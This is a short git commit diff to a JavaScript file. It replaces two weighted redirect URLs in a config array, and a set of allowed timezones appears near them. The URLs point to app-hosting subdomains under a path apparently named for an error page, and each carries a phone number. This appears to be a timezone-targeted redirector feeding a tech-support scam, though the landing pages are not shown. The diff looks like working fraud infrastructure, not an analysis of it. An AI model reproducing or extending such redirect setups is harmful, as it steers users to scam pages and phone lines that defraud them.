076066fc27458186be4c14a48e7d6d350456b6f4
paalakash <palaksh452@gmail.com>
2026-06-05 09:13:23 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,8 +31,8 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://seahorse-app-piu3b.ondigitalocean.app/werrx01USAHTML/?bcda=1800-182-567", weight: 0.5 },
-    { url: "https://seahorse-app-piu3b.ondigitalocean.app/werrx01USAHTML/?bcda=1800-182-567", weight: 0.5 }
+    { url: "https://seal-app-yk4be.ondigitalocean.app/werrx01USAHTML/?bcda=1800 182 567", weight: 0.5 },
+    { url: "https://seal-app-yk4be.ondigitalocean.app/werrx01USAHTML/?bcda=1800 182 567", weight: 0.5 }
 
 ];
 
